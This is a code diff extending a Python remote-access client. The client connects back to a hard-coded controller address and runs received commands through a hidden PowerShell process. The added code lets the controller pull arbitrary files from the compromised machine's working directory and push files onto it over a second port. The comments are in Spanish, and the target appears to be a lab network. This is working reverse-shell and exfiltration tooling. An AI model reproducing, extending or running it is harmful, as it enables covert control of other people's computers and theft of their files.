@@ -1,4 +1,3 @@
-
 #!/usr/bin/env python3
 import socket
 import subprocess
@@ -6,10 +5,13 @@ import threading
 import time
 import struct
 import queue
- 
+import os
+import shlex
+
 HOST = "192.168.100.138"
 PORT = 443
- 
+FILE_TRANSFER_PORT = 444
+
 SENTINEL     = b"<CMD_DONE>"
 SENTINEL_STR = "<CMD_DONE>"
  
@@ -29,7 +31,8 @@ class Client:
         )
         self.client_socket = None
         self.reader_thread = None
-        
+        self.cwd = ""
+
         # semaforos binarios
         #event.set()    # pone el estado en True
         #event.clear()  # pone el estado en False
@@ -47,6 +50,8 @@ class Client:
     def _ps_read(self):
         """Lee stdout de PowerShell y encola cada línea."""
         for line in self.proc.stdout:  # pyright: ignore
+            if line.startswith("PATH:"):
+                self.cwd = line.replace("PATH:", "").strip()
             self._output_queue.put(line)
  
     def connect(self, host, port):
@@ -117,7 +122,68 @@ class Client:
         self.proc.stdin.flush()                                        # pyright: ignore
         self.proc.stdin.write(f'Write-Host "{SENTINEL_STR}"\n')       # pyright: ignore
         self.proc.stdin.flush()                                        # pyright: ignore
- 
+    
+    def upload_to_server(self, files):
+        while True:
+            try:
+                new_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                new_client_socket.connect((HOST, FILE_TRANSFER_PORT))
+                break
+            except ConnectionRefusedError:
+                # El servidor aún no hizo .accept() o no está escuchando, por el caso de que se hace connect antes que accept del lado del server
+                time.sleep(1)
+            except Exception:
+                return None
+        
+        for file in files:
+            complete_path = os.path.join(self.cwd, file)
+
+            if os.path.exists(complete_path) and os.path.isfile(complete_path):
+                size = os.path.getsize(complete_path)
+                new_client_socket.sendall(struct.pack("Q", size))
+
+                with open(complete_path, "rb") as f:
+                    while True:
+                        chunk = f.read(4096)
+                        if not chunk:
+                            break
+                        new_client_socket.sendall(chunk)
+            else:
+                new_client_socket.sendall(struct.pack("Q", 0)) # envio 0 para que el server no cuelge
+
+            
+        new_client_socket.close()
+    
+    def download_from_server(self, files):
+        while True:
+            try:
+                new_client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                new_client_socket.connect((HOST, FILE_TRANSFER_PORT))
+                break
+            except ConnectionRefusedError:
+                time.sleep(1)
+            except Exception:
+                return None
+
+        for file in files:
+            raw_size = new_client_socket.recv(8)
+            if not raw_size:
+                break
+            file_size = struct.unpack("Q", raw_size)[0]
+            if file_size == 0:
+                continue
+            bytes_received = 0
+            filename = file.split("\\")[-1].split("/")[-1]
+            with open(filename, "wb") as f:
+                while bytes_received < file_size:
+                    chunk = new_client_socket.recv(min(4096, file_size - bytes_received))
+                    if not chunk:
+                        break
+                    f.write(chunk)
+                    bytes_received += len(chunk)
+
+        new_client_socket.close()
+
     def run(self):
         while True:
             try:
@@ -136,7 +202,18 @@ class Client:
                     cmd = self.recieve_data(self.client_socket)
                     if cmd in ("exit", "quit"):
                         break
- 
+                    
+                    if cmd.startswith("download "): # voy a subirle archivo
+                        files = shlex.split(cmd)[1:]
+                        self._cmd_ready.set()
+                        threading.Thread(target=self.upload_to_server, args=(files,), daemon=True).start()
+                        continue
+
+                    if cmd.startswith("upload "): # voy a descargar archivo al local
+                        files = shlex.split(cmd)[1:]
+                        self._cmd_ready.set()
+                        threading.Thread(target=self.download_from_server, args=(files,), daemon=True).start()
+                        continue
                     self._cmd_ready.wait()
                     self._cmd_ready.clear()
  
